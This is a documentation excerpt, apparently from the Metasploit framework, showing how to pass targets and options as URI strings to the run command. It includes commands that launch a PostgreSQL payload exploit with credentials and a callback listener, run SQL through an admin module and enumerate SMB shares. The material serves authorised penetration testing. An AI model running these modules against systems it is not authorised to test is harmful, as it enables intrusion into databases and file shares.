## Examples

Traditional usage of Metasploit involves loading a module, and setting multiple options individually:

```
use exploit/linux/postgres/postgres_payload
set username administrator
set password pass
set rhost 192.168.123.6
set rport 5432
set database postgres
set lhost 192.168.123.1
set lport 5000
run
```

Traditionally, you can also specify multiple RHOSTS separated by spaces or with a CIDR subnet mask:

```
set rhosts 127.0.0.1 127.0.0.2
set rhosts 127.0.0.1/24
```

This document describes a modern approach to setting multiple options in a command. This workflow will not only make it easier to use `reverse-i-search` with `CTRL+R` in Metasploit's console, but it will also make it easier to share cheat sheets amongst pentesters.

### URI support for RHOSTS

Metasploit now supports the use of [URI](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier) strings as arguments to the run command to specify RHOST values and option values at once:

```
use exploit/linux/postgres/postgres_payload
run postgres://administrator:pass@192.168.123.6 lhost=192.168.123.1 lport=5000
```

The following protocols are currently supported, and described in more detail below:

- cidr - Can be combined with other protocols to specify address subnet mask length
- file - Load a series of RHOST values separated by newlines from a file. This file can also include URI strings
- http
- https
- mysql
- postgres
- smb
- ssh

To preserve whitespace, regardless of the protocol, use quotes:

```
use auxiliary/admin/postgres/postgres_sql
run 'postgres://user:this is my password@192.168.1.123/database_name' sql='select version()'
```

In some scenarios it may be too troublesome to escape quotes within a password. In this scenario it possible to still set the password option manually and use the URI argument without a password specified, the module will gracefully fallback to using the manually set password:

```
set password !@£$%^&*()"'
run smb://user@192.168.123.13
```

You can also specify multiple RHOST arguments, as well as provide additionally inlined options:

```
use scanner/smb/smb_enumshares
run smb://test:test@192.168.1.223 smb://user:password@192.168.1.223 smb://test:test@127.0.0.1 verbose=true
```
